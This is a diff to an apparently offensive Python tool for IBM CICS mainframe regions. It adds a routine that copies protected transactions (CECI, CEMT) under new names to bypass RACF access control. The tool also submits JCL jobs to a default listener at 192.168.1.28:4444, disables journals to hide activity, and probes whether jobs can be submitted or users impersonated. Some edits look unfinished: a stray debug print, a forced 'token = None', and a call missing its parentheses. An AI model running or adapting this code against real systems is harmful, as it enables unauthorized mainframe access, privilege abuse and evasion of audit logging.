@@ -42,6 +42,8 @@ TRAN_NUMBER = 1000
 SLEEP = 0.5
 AUTHENTICATED = False
 DO_AUTHENT = False
+CECI = "CECI"
+CEMT = "CEMT"
 
 # TO DO:
 #   Write a CICS SHELL in COBOL
@@ -254,7 +256,7 @@ def do_authenticate(userid, password, pos_pass):
    em.move_to(pos_pass,posy+1)
    em.safe_send(results.password)
    em.send_enter()
-   
+  
    data = em.screen_get()
    if any("Your userid is invalid" in s for s in data):
       whine('Incorrect userid information','err')
@@ -278,14 +280,16 @@ def check_valid_applid(applid, do_authent, method = 1):
         pos_pass=1;
         data = em.screen_get()   
         for d in data:
-            if "PASSWORD" in d.upper() or "CODE" in d.upper() or "PASSE" in d.upper():
+            if "Password" in d or "Code" in d or "passe" in d:
                 break;
             else:
                pos_pass +=1
             if pos_pass > 23:
                 whine("Could not find a password field. Was looking for \"password\", \"code\" or \"pass\" strings",'err')
                 sys.exit();
+        
         do_authenticate(results.userid, results.password, pos_pass)
+        whine("Successful authentication",'good')
     
     if method ==1:
       em.send_clear()
@@ -322,10 +326,11 @@ def query_cics(request, verify, line):
       Function to send a request to CICS and see if it worked.
       It does not support double send (required for CECI)
     """
+    
     em.move_to(1,2)
     em.safe_send(format_request(request))
     em.send_enter()
-    
+        
     data = em.screen_get()
     if verify in data[line-1].strip():
         return True
@@ -385,6 +390,7 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
         em.send_pf11()
         i +=1;
     data = em.screen_get()
+        
     if "NOT AUTHORIZED" in data[2]:
         whine (request+" not authorized", 'err')
         return None
@@ -432,7 +438,7 @@ def get_hql_files():
     
     em.move_to(1,2)
     
-    em.safe_send(format_request("CEMT I DSNAME"))
+    em.safe_send(format_request(CEMT+" I DSNAME"))
     em.send_enter()
     
     data = em.screen_get()
@@ -453,7 +459,7 @@ def get_hql_libraries():
     found_dfhrpl= False;
     em.move_to(1,2)
     
-    em.safe_send(format_request("CEMT I LIBRARY"))
+    em.safe_send(format_request(CEMT+" I LIBRARY"))
     em.send_enter()
     
     data = em.screen_get()
@@ -477,7 +483,7 @@ def get_users():
     out = []
     em.move_to(1,2)
 
-    em.safe_send(format_request("CEMT I TASK"))
+    em.safe_send(format_request(CEMT+" I TASK"))
     em.send_enter()
     
     data = em.screen_get()
@@ -497,7 +503,7 @@ def get_version():
    """
       Called by get_infos(). retrieves current version of CICS
     """
-   version = query_cics_scrap("CEMT I SYS", "Cicstslevel(", 8, 0, 0 )
+   version = query_cics_scrap(CEMT+" I SYS", "Cicstslevel(", 8, 0, 0 )
    if version:
      version = version.strip("0").replace("0",".")
    return version
@@ -506,24 +512,121 @@ def get_default_user():
    """
       Called by get_infos(). retrieves the default pre auth user
     """
-   default_user = query_cics_scrap("CEMT I SYS", "Dfltuser(", 8, 0, 0 )
+   default_user = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0 )
    return default_user     
-   
+
+def activate_supplied(old_name, old_group, new_name, new_group):
+    global CECI
+    global CEMT
+    
+    em.move_to(1,2)
+    req_copy ="CEDA COPY TRANS("+old_name.upper()+") GROUP("+old_group.upper()+") AS("+new_name.upper()+") TO("+new_group.upper()+")"
+    em.safe_send(format_request(req_copy));
+    em.send_enter();
+    
+    data = em.screen_get();
+        
+    if "already exists" in data[20]:
+        whine("Already copied "+old_name.upper()+" to "+new_name.upper()+" in group "+old_group.upper(),"info")
+        
+    
+    elif not "COPY SUCCESSFUL" in data[22]:
+        whine('Could not copy '+old_name.upper()+' to a new transaction name '+new_name.upper()+' in group '+new_group.upper(),'err')
+        whine(data[22],'err')
+        return False
+    else:
+        whine(old_name.upper()+' successfully copied to '+new_name.upper(),'good')
+    em.move_to(1,2)
+    req_install ="INSTALL TRANS("+new_name.upper()+") GROUP("+new_group.upper()+")"
+    em.safe_send(format_request(req_install));
+    em.send_enter();
+    data = em.screen_get();
+    
+    if not "INSTALL SUCCESSFUL" in data[22]:
+        whine('Could not install new '+new_name.upper()+' transaction in group '+new_group.upper()+'','err')
+        whine(data[22],'err')
+        return False
+    else:
+        whine(new_name.upper()+' successfully installed','good')
+        
+    if old_name.upper()=="CECI":
+        CECI = new_name.upper()
+    if old_name.upper()=="CEMT":
+        CEMT = new_name.upper()
+    em.send_pf3()
+    
+    return True
+    
 def get_infos():
     """
       retrieves meaningful information about CICS
     """
-    cemt = True
-    ceci = True
-    cecs = False
-    ceda = True
-    cedf = True
-    cebr = False
+    global CEMT
+    global CECI
+    is_cemt = False
+    is_ceci = False
+    is_cecs = False
+    is_ceda = True
+    is_cedf = True
+    is_cebr = False
     userid = ''
     hlq_files = None
     hlq_libraries = None
     version = None
+    spool, tdqueue, tdqueue2 = None, None,None
+       
+    whine("Interesting and available IBM supplied transactions: ", 'info')
+    if query_cics('CEMT','Inquire',5):
+      is_cemt = True
+      em.send_pf3()
+      whine("CEMT", 'good',1)
+    
+    if query_cics('CEDA','ALter',5):
+      is_ceda = True
+      em.send_pf3()        
+      whine("CEDA", 'good',1)
+    
+    if query_cics('CECI','ACquire',5):
+        is_ceci = True
+        em.send_pf3()
+        whine("CECI", 'good',1)
+    if query_cics('CECS','ACquire',5):
+        is_cecs = True
+        em.send_pf3()
+        whine("CECS", 'good',1)
+    if query_cics('CEDF ,OFF','EDF MODE OFF',1):
+        is_cedf = True
+        em.send_pf3()
+        whine("CEDF", 'good',1)
+    if query_cics('CEBR','ENTER COMMAND',2):
+        is_cebr = True
+        em.send_pf3()
+        whine("CEBR", 'good',1)
         
+    em.send_clear()
+    
+        
+    if not is_ceci and not is_ceda:
+        whine("CECI is not available. Little information will be available on the system", 'err')
+        
+    if is_ceda and (not is_ceci or not is_cemt):
+        whine("CECI and CEMT are not available. Little information will be available on the system", 'err')
+        response = raw_input(bcolors.YELLOW+'[!] Try to bypass RACF protection ? Y/N [Y]: '+bcolors.ENDC)
+        
+        if response.upper() != "N":
+            if not is_ceci and activate_supplied("CECI","DFHCOMP1","CSPK","DDDD") and query_cics(CECI,'ACquire',5):
+                em.send_pf3()
+                is_ceci = True
+                whine("CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",'good')
+            else:
+                whine('Could not activate CECI','err');
+            if not is_cemt and activate_supplied("CEMT","DFHCOMP3","CSPS","DDDD") and query_cics(CEMT,'Inquire',5):
+                em.send_pf3()
+                is_cemt = True
+                whine("CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",'good')
+    
+    
+    whine("General system information: ", 'info')
     version = get_version()
     if version :
        whine("CICS TS Version: "+version, 'good',1)
@@ -532,45 +635,10 @@ def get_infos():
     
     if default_user :
        whine("CICS default user: "+default_user, 'good',1)
-       
-    whine("Interesting and available IBM supplied transactions: ", 'info')
-    if query_cics('CEMT','Inquire',5):
-      cemt = True
-      em.send_pf3()
-      whine("CEMT", 'good',1)
     
-    if query_cics('CEDA','ALter',5):
-      ceda = True
-      em.send_pf3()        
-      whine("CEDA", 'good',1)
     
-    if query_cics('CECI','ACquire',5):
-        ceci = True
-        em.send_pf3()
-        whine("CECI", 'good',1)
-    if query_cics('CECS','ACquire',5):
-        ceci = True
-        em.send_pf3()
-        whine("CECS", 'good',1)
-    if query_cics('CEDF ,OFF','EDF MODE OFF',1):
-        cedf = True
-        em.send_pf3()
-        whine("CEDF", 'good',1)
-    if query_cics('CEBR','ENTER COMMAND',2):
-        cebr = True
-        em.send_pf3()
-        whine("CEBR", 'good',1)
-        
-    em.send_clear()
-    
-        
-    if not ceci:
-        whine("Little information will be available on the system", 'err')
-        
-    
-    whine("General system information: ", 'info')
     variables = ["USERID", "SYSID","NET","NATl"]
-    values = get_cics_value('CECI ASSIGN', variables, True)        
+    values = get_cics_value(CECI+' ASSIGN', variables, True)        
     userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
        
     
@@ -596,23 +664,23 @@ def get_infos():
         whine('No active user', 'info',1)
         
     whine("JCL Submission", 'info')
+    if is_cemt:
+        tdqueue = query_cics_scrap(CEMT+' INQUIRE TDQueue DDN (INREADER)', 'Tdq(', 4, 0, 0)
+        tdqueue2 = query_cics_scrap(CEMT+' INQUIRE TDQueue DDN (INTRDR)', 'Tdq(', 4, 0, 0)
     
-    if cemt:
-        tdqueue = query_cics_scrap('CEMT INQUIRE TDQueue DDN (INREADER)', 'Tdq(', 4, 0, 0)
-        tdqueue2 = query_cics_scrap('CEMT INQUIRE TDQueue DDN (INTRDR)', 'Tdq(', 4, 0, 0)
-    
-    
-    if (tdqueue !="*" or tdqueue2 !="*") and  (tdqueue or tdqueue2 ) and ceci:
+    print tdqueue
+    if (tdqueue or tdqueue2 ) and (tdqueue !="*" or tdqueue2 !="*") and is_ceci:
         whine('Transiant queue to access spool is apparently available','good',1)
         whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2)
     
-      
-    spool = send_cics('CECI SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
     
-    if spool and ceci:
+    if is_ceci:
+        spool = send_cics(CECI+' SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
+    
+    if spool:
         whine('Access to the internal spool is apparently available','good',1)
               
-    if spool == False and tdqueue ==False:
+    if not spool and not tdqueue:
         whine('No way to submit JCL through this CICS region','err',1)
     
     whine("Access control", 'info')
@@ -642,7 +710,7 @@ def get_transactions(transid):
      em.move_to(1,2)
      
      print "ID\tPROGRAM"
-     em.safe_send('CEMT Inquire Trans('+transid+') en                                           ')
+     em.safe_send(CEMT+' Inquire Trans('+transid+') en                                           ')
      em.send_enter()
      
      #sleep()
@@ -675,7 +743,7 @@ def get_tsqueues(tsqueue):
           
      print "Tsqueue\tItems\tLength\tTransaction"
      
-     em.safe_send(format_request('CEMT Inquire Tsq('+tsqueue+')'))
+     em.safe_send(format_request(CEMT+' Inquire Tsq('+tsqueue+')'))
      em.send_enter()
      
      #sleep()
@@ -717,7 +785,7 @@ def get_files(filename):
           
      print "FILE\tTYPE\tSTATUS\tREAD\tUPDATE\tDISP\tLOCATION"
      
-     em.safe_send(format_request('CEMT Inquire File('+filename+')'))
+     em.safe_send(format_request(CEMT+' Inquire File('+filename+')'))
      em.send_enter()
      
      #sleep()
@@ -757,7 +825,11 @@ def fetch_tsq_item(tsq_name, item):
         Gets the record item in a temporary storage queue.
     """
     em.move_to(1,2)
-    req_read = 'CECI READQ TS QUEUE('+tsq_name.upper()+') ITEM('+str(item)+') INTO(&FI)'
+    if item==1:
+        req_read = CECI +'READQ TS QUEUE('+tsq_name.upper()+') ITEM('+str(item)+') INTO(&FI)'
+    else:
+        req_read = 'READQ TS QUEUE('+tsq_name.upper()+') ITEM('+str(item)+') INTO(&FI)'
+        
     em.safe_send(req_read)
     em.send_enter()
     em.send_enter() # Send twice Enter to confirm transaction
@@ -804,7 +876,7 @@ def get_tsq_content():
     
     
     ## get file properties ##
-    req_list_file = 'CEMT I TSQ('+tsq_name.upper()+')'
+    req_list_file = CEMT+' I TSQ('+tsq_name.upper()+')'
     em.safe_send(format_request(req_list_file))
     em.send_enter()
     data = em.screen_get()
@@ -829,7 +901,12 @@ def fetch_content(filename, ridfld, keylength):
         ridfld is they index key in a VSAM file
     """
     em.move_to(1,2)
-    req_read = 'CECI READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
+    
+    if int(ridfld)==0:
+        req_read = CECI+' READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
+    else:
+        req_read = 'READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
+        
     em.safe_send(req_read)
     em.send_enter()
     em.send_enter() # Send twice Enter to confirm transaction
@@ -878,7 +955,7 @@ def get_file_content():
     ridfld = "000000";
     
     ## get file properties ##
-    req_list_file = 'CEMT I READ FI('+filename.upper()+')'
+    req_list_file = CEMT+' I READ FI('+filename.upper()+')'
     em.safe_send(format_request(req_list_file))
     em.send_enter()
     data = em.screen_get()
@@ -904,7 +981,7 @@ def get_file_content():
             whine(data[22],'err')
     # getting key length and record size. Can only do when then the file is enabled and opened
     em.move_to(1,2)
-    req_list_file = 'CEMT I READ FI('+filename.upper()+')'
+    req_list_file = 'I READ FI('+filename.upper()+')'
     em.safe_send(format_request(req_list_file))
     em.send_enter()
     
@@ -939,6 +1016,7 @@ def get_file_content():
     
     while int(next_ridfld) != -1 and int(next_ridfld) < 1000000:
        ridfld = next_ridfld
+       
        next_ridfld = fetch_content(filename, ridfld, keylength)
        next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
                 
@@ -1189,13 +1267,13 @@ def set_mixedCase():
     em.send_pf3()
     whine('Setting the current terminal to mixed case',kind='info')
     em.move_to(1,2)
-    em.safe_send(format_request('CEMT I TASK')) #CICS APPLID in VTAM
+    em.safe_send(format_request(CEMT+' I TASK')) #CICS APPLID in VTAM
     em.send_enter()
     
     data = em.screen_get()
     for d in data:
         termID = None
-        if "Fac(" in d and "CEMT" in d:
+        if "Fac(" in d and CEMT in d:
             pos = d.find("Fac(")+len("Fac(")
             termID = d[pos:pos+4]
             whine('Got TerminalID '+termID,'good', 1)
@@ -1208,7 +1286,7 @@ def set_mixedCase():
     em.move_to(1,2)
     sleep(SLEEP)
     
-    req_set_term = 'CECI SET TERM('+termID+') NOUCTRAN'
+    req_set_term = CECI+' SET TERM('+termID+') NOUCTRAN'
     em.safe_send(format_request(req_set_term))
     em.send_enter()
     em.send_enter()
@@ -1231,7 +1309,7 @@ def open_spool():
     else:
        node = 'LOCAL'
        
-    req_open_spool = "CECI SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('"+node+"') TOKEN(&TOKTEST)"
+    req_open_spool = CECI+" SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('"+node+"') TOKEN(&TOKTEST)"
     em.safe_send(format_request(req_open_spool))
     em.send_enter()
     em.send_enter()
@@ -1391,7 +1469,7 @@ def check_tdqueue():
        whine('No queue name provided, assuming default: IRDR', 'info')
     else:
        queue = results.queue.upper()
-    if not (send_cics('CEMT INQUIRE TDQueue ('+queue+')',False)):
+    if not (send_cics(CEMT+' INQUIRE TDQueue ('+queue+')',False)):
         whine("No TDQueue named "+queue+" is installed on CICS",'err')
         return False
     
@@ -1406,7 +1484,12 @@ def write_tdqueue(jcl):
     """
          
     em.move_to(1,2)
-    req_enq_tdq = "CECI ENQ RESOURCE("+queue+")"
+    if not results.queue:
+        queue = "IRDR"
+    else:
+        queue = results.queue
+        
+    req_enq_tdq = CECI+" ENQ RESOURCE("+queue+")"
     em.safe_send(format_request(req_enq_tdq))
     em.send_enter()
     
@@ -1428,11 +1511,16 @@ def write_tdqueue(jcl):
         em.send_enter()
         #sleep()
         
-               
-        em.move_to(7,24)
-        em.safe_send(j)        
+        em.move_to(7,2)
         em.send_enter()
-        #sleep()            
+        k= 0;
+        while k < len(j):
+          em.move_to((k/64)+3,11)
+          em.safe_send(j[k:k+64])
+          k+=64
+        em.send_enter
+               
+                
         
         # back to the normal screen
         em.send_enter()
@@ -1442,7 +1530,6 @@ def write_tdqueue(jcl):
         em.send_enter()  
         em.send_enter()
         
-        #show_screen()  
         
         i += 1
         if i <= total:
@@ -1453,7 +1540,7 @@ def write_tdqueue(jcl):
             whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
             return False
      
-    req_deq_tdq = "CECI DEQ RESOURCE("+queue+")"
+    req_deq_tdq = "DEQ RESOURCE("+queue+")"
     em.safe_send(format_request(req_deq_tdq))
     em.send_enter()
     whine('JCL Written to TDqueue, it should be executed any second','good',1)
@@ -1468,7 +1555,7 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
     
     method = None
     token = open_spool()
-    
+    token = None
     if token:
          method = "spool"
     elif not token and check_tdqueue():
@@ -1507,7 +1594,6 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         spool_write(token, jcl)
         close_spool()
     elif method=="tdqueue":
-      em.send_pf3()
       write_tdqueue(jcl)
 
 def activate_transaction(ena_trans):
@@ -1518,7 +1604,7 @@ def activate_transaction(ena_trans):
     trans_ena  = False
     ## get transaction properties ##
     if ena_trans.upper() != "ALL":
-        req_list_trans = 'CEMT I TRANS('+ena_trans.upper()+')'
+        req_list_trans = CEMT+' I TRANS('+ena_trans.upper()+')'
         em.safe_send(format_request(req_list_trans))
         em.send_enter()
    
@@ -1526,12 +1612,12 @@ def activate_transaction(ena_trans):
         if "Ena " in data[2]:
             whine("Transaction "+ena_trans+" is already enabled", 'good')
             sys.exit();
+        req_set_trans = 'Set TRANSACTION('+ena_trans.upper()+') ENA'
         
     em.move_to(1,2)
     if ena_trans.upper()=="ALL":
-        req_set_trans = 'CEMT S TRANS ALL ENA'
-    else:
-        req_set_trans = 'CEMT Set TRANSACTION('+ena_trans.upper()+') ENA'
+        req_set_trans = CEMT+' S TRANS ALL ENA'
+        
     em.safe_send(format_request(req_set_trans))
     em.send_enter()
     data = em.screen_get()
@@ -1548,7 +1634,7 @@ def disable_journal():
     number_journals = 0;
     all_journals = 0;
     em.move_to(1,2)
-    req_set_jour = "CEMT S JOURNAL ALL DIS"
+    req_set_jour = CEMT+" S JOURNAL ALL DIS"
     em.safe_send(format_request(req_set_jour))
     em.send_enter()
     
@@ -1571,29 +1657,30 @@ def fetch_userids():
     """
         Looks in different menus for userids
     """
-    default_u = tcl_u = query_cics_scrap("CEMT I SYS", "Dfltuser(", 8, 0, 0)
+    
+    default_u = tcl_u = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0)
     region_id= None;
     print default_u+" (Default user)" if default_u else '';
     
-    tcl_u = query_cics_scrap("CEMT I TCL", "Installu(", 8, 0, 0)
+    tcl_u = query_cics_scrap(CEMT+" I TCL", "Installu(", 8, 0, 0)
     if not tcl_u:
-      tcp_u = query_cics_scrap("CEMT I TCPIPSERV", "Installusrid(", 8, 1, 1)
+      tcp_u = query_cics_scrap(CEMT+" I TCPIPSERV", "Installusrid(", 8, 1, 1)
       print tcp_u if tcp_u else '';
     else:
       print tcl_u
       
-    con_u = query_cics_scrap("CEMT I CONN", "Changeusrid(", 8, 1, 1)
+    con_u = query_cics_scrap(CEMT+" I CONN", "Changeusrid(", 8, 1, 1)
     print con_u if con_u else '';
-    uri_u = query_cics_scrap("CEMT I URIMAP", "Userid(", 8, 1, 1)
+    uri_u = query_cics_scrap(CEMT+" I URIMAP", "Userid(", 8, 1, 1)
     print uri_u  if uri_u else '';
     
-    db2_u = query_cics_scrap("CEMT I DB2C", "Signid(", 8, 1, 1)
+    db2_u = query_cics_scrap(CEMT+" I DB2C", "Signid(", 8, 1, 1)
     print db2_u if db2_u else '';
     
-    pro_u = query_cics_scrap("CEMT I PROFILE", "Installu(", 8, 0, 0)
+    pro_u = query_cics_scrap(CEMT+" I PROFILE", "Installu(", 8, 0, 0)
     print pro_u if pro_u else '';
     
-    uow_u = query_cics_scrap("CEMT I UOW ", "Use(", 8, 0, 0)
+    uow_u = query_cics_scrap(CEMT+" I UOW ", "Use(", 8, 0, 0)
     if uow_u:
        for uu in uow_u.split("\n"):
            if default_u and default_u != uu:
@@ -1608,7 +1695,7 @@ def check_surrogat(surrogat_user):
     """
     whine("A JOB gets submitted with CICS Region ID, which may or may not impersonate users no matter the result of this check", 'warn')
     variables = ["READ"]
-    read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
+    read = get_cics_value(CECI+' QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
     read = ''.join(read)
     if read == "+0000000035":
         whine('CICS does not use RACF/ACF2/TopSecret. It is impossible to query the SURROGAT class','err',0)
@@ -1617,7 +1704,7 @@ def check_surrogat(surrogat_user):
     variables = ["READ"]
     length = str(len(surrogat_user)+ 6)
     
-    read = get_cics_value('CECI QUERY SECURI RESC(SURROGAT) RESID('+surrogat_user.upper()+'.SUBMIT) RESIDL('+length+') ', variables, True)
+    read = get_cics_value(CECI+' QUERY SECURI RESC(SURROGAT) RESID('+surrogat_user.upper()+'.SUBMIT) RESIDL('+length+') ', variables, True)
     read = ''.join(read)
     if read == "+0000000035":
         whine('You can impersonate '+surrogat_user,'good',0)
@@ -1629,24 +1716,25 @@ def check_propagate(propagate_user):
         use CECI QUERY Security to check if CICS region ID can submit JOBS
     """
     variables = ["READ"]
-    read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
+    read = get_cics_value(CECI+' QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
     read = ''.join(read)
     if read == "+0000000035":
         whine('CICS does not use RACF/ACF2/TopSecret. It is impossible to query the SURROGAT class','err',0)
         sys.exit()    
     
     length = str(len(propagate_user))
-    result = send_cics('CECI QUERY SECURI RESC(PROPCNTL) RESID('+propagate_user.upper()+') RESIDL('+length+')', True)
+    result = send_cics(CECI+' QUERY SECURI RESC(PROPCNTL) RESID('+propagate_user.upper()+') RESIDL('+length+')', True)
     
     if result:
         whine(propagate_user+' defined in PROPCNTL, it is not allowed to submit JOBS','err',0)
     else:
-        whine(propagate_user+' not defined in PROPCNTL','good',0)
+        whine(propagate_user+' not defined in PROPCNTL. It can submit JOBS','good',0)
 
 def main(results):
     global DO_AUTHENT
     global AUTHENTICATED
-           
+    global CEMT
+    global CECI       
     
     if (results.userid != None and results.password !=None):
        
@@ -1667,6 +1755,10 @@ def main(results):
            AUTHENTICATED = True;
         
      
+    # Assigning new transaction names to CECI and CEMT if need be
+    CEMT = results.cemt
+    CECI = results.ceci
+    
     # Checking if APPLID provided is valid
     if not check_valid_applid(results.applid, DO_AUTHENT):
         whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
@@ -1746,7 +1838,6 @@ def main(results):
         check_propagate(results.propagate_user)
     
     elif results.all_options:
-        whine("Getting all available information from CICS TS", 'info')
         get_infos()
         print ""
         whine("Getting all files", 'info')
@@ -1756,6 +1847,7 @@ def main(results):
         get_tsqueues("*")
         print ""
         whine("Scraping userids from different menus", 'info')
+        em.send_pf3();
         region_id = fetch_userids()
         if region_id:
              check_propagate(region_id)
@@ -1802,6 +1894,8 @@ if __name__ == "__main__" :
     group_info.add_argument('-u', '--userids', help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
     group_info.add_argument('-p', '--pattern', help='Specify a pattern of a files/transaction/tsqueue to get (default is "*")',default="*",dest='pattern')
     group_info.add_argument('-q', '--quiet', help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
+    group_info.add_argument('--ceci', help='CECI new transaction name. Result of -i option.',default="CECI",dest='ceci')
+    group_info.add_argument('--cemt', help='CEMT new transaction name. Result of -i option.',default="CEMT",dest='cemt')
     
     
     group_trans.add_argument('-t','--trans', help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
